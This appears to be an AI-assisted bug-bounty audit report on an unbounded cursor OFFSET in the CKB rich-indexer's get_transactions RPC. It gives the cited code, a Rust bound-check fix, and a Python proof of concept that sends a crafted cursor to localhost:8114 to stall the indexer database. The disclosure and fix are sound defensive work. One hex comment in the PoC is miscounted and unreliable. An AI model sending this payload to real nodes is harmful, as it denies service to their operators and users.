The code confirms all cited claims. Let me verify the exact lines:

- `decode_i32` at [1](#0-0)  only validates byte length, not numeric range.
- The `after` cursor parsing at [2](#0-1)  enforces only a 12-byte length check.
- The decoded offset is passed verbatim to `query_builder.offset(offset)` at [3](#0-2) .
- `limit` is bounded at [4](#0-3)  but no equivalent guard exists for the cursor-derived offset.

---

Audit Report

## Title
Unbounded OFFSET from Cursor Enables DoS of Indexer RPC via `get_tx_with_cell` — (`util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs`)

## Summary
The `get_transactions` RPC (ungrouped mode) decodes the last 4 bytes of the `after` cursor into an `i32` offset and passes it directly to the SQL query builder with no upper-bound validation. An unprivileged caller can supply an `after` value encoding `i32::MAX` (2,147,483,647), causing the database to execute `OFFSET 2147483647`, which forces a full sequential scan that blocks the indexer DB connection and causes all subsequent indexer RPC calls to queue or time out.

## Finding Description
`decode_i32` (`mod.rs` L286–294) reinterprets 4 bytes as a little-endian `i32` with no range check on the resulting integer. In `get_transactions` (`get_transactions.rs` L44–54), the `after` cursor is split into an 8-byte `tx_id` and a 4-byte `offset`; the only guard is that the total length equals 12 bytes. No maximum is enforced on the decoded offset value. The decoded offset is then forwarded without any bound check to `query_builder.offset(offset)` at L180–182 inside `get_tx_with_cell`, producing a query of the form `SELECT ... LIMIT <limit> OFFSET 2147483647`. Both SQLite and PostgreSQL must scan and discard up to 2 billion rows before returning results. By contrast, the `limit` parameter is validated against `self.request_limit` (L27–31) before any query is built; no equivalent guard exists for the cursor-derived offset.

## Impact Explanation
The indexer DB connection is saturated for the duration of the malicious query, causing all subsequent `get_transactions`, `get_cells`, and related indexer RPC calls to queue or time out. The core CKB node (P2P, consensus, block sync) is not directly affected. This matches the allowed bounty impact: **Note (0–500 points) — Any local RPC API crash**.

## Likelihood Explanation
The rich-indexer RPC is exposed on the standard CKB RPC port (default 8114) with no authentication. Any network-reachable client can call `get_transactions` with a crafted `after` value. The 12-byte cursor format is derivable from any prior `get_transactions` response. The attack is deterministic, requires no special privileges, and is trivially repeatable.

## Recommendation
Add an explicit upper-bound check on the decoded offset immediately after `decode_i32`, before constructing `last_cursor`. The offset only ever needs to represent the number of rows sharing the same `tx_id` within a single page, so it should be bounded by at most `self.request_limit`:

```rust
let offset = decode_i32(offset)?;
if offset < 0 || offset as usize > self.request_limit {
    return Err(Error::Params("cursor offset out of range".to_string()));
}
last_cursor = Some((last, offset));
```

## Proof of Concept
```python
import struct, requests

# 8-byte tx_id (all zeros) + 4-byte offset = i32::MAX little-endian
tx_id  = b'\x00' * 8
offset = struct.pack('<i', 2147483647)   # bytes: ff ff ff 7f
after  = "0x" + (tx_id + offset).hex()  # "0x000000000000000ffffffff7f"

payload = {
    "id": 1, "jsonrpc": "2.0",
    "method": "get_transactions",
    "params": [{
        "script": {
            "code_hash": "0x" + "00"*32,
            "hash_type": "type",
            "args": "0x"
        },
        "script_type": "lock"
    }, "asc", "0x1", after]
}
# Send to http://localhost:8114 — response will hang for the duration of the DB scan
requests.post("http://localhost:8114", json=payload, timeout=300)
```

### Citations

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs (L286-294)
```rust
fn decode_i32(data: &[u8]) -> Result<i32, Error> {
    if data.len() != 4 {
        return Err(Error::Params(
            "unable to convert from bytes to i32 due to insufficient data in little-endian format"
                .to_string(),
        ));
    }
    Ok(i32::from_le_bytes(to_fixed_array(&data[0..4])))
}
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L27-31)
```rust
        if limit as usize > self.request_limit {
            return Err(Error::invalid_params(format!(
                "limit must be less than {}",
                self.request_limit,
            )));
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L44-54)
```rust
                if let Some(after) = after {
                    if after.len() != 12 {
                        return Err(Error::Params(
                            "Unable to parse the 'after' parameter.".to_string(),
                        ));
                    }
                    let (last, offset) = after.as_bytes().split_at(after.len() - 4);
                    let last = decode_i64(last)?;
                    let offset = decode_i32(offset)?;
                    last_cursor = Some((last, offset));
                };
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L180-182)
```rust
    if let Some((_, offset)) = last_cursor {
        query_builder.offset(offset);
    }
```
